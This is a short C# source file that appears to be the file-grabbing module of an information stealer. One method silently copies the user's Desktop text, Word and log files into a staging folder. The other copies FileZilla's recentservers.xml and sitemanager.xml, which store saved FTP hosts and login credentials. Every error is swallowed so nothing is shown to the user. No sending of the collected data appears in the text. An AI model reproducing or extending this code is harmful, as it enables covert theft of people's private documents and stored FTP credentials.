namespace NoFile
{
    using System;
    using System.IO;

    internal class Files
    {
        public static void Desktop(string directorypath)
        {
            try
            {
                foreach (FileInfo info in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                {
                    if ((info.Extension.Equals(".txt") || info.Extension.Equals(".doc")) || (info.Extension.Equals(".docx") || info.Extension.Equals(".log")))
                    {
                        Directory.CreateDirectory(directorypath + @"\Desktop\");
                        info.CopyTo(directorypath + @"\Desktop\" + info.Name);
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static void FileZilla(string path)
        {
            Directory.CreateDirectory(path + @"\Filezilla");
            try
            {
                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Filezilla\recentservers.xml", path + @"\Filezilla\filezilla_recentservers.xml", true);
            }
            catch
            {
            }
            try
            {
                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Filezilla\sitemanager.xml", path + @"\Filezilla\filezilla_sitemanager.xml", true);
            }
            catch
            {
            }
        }
    }
}

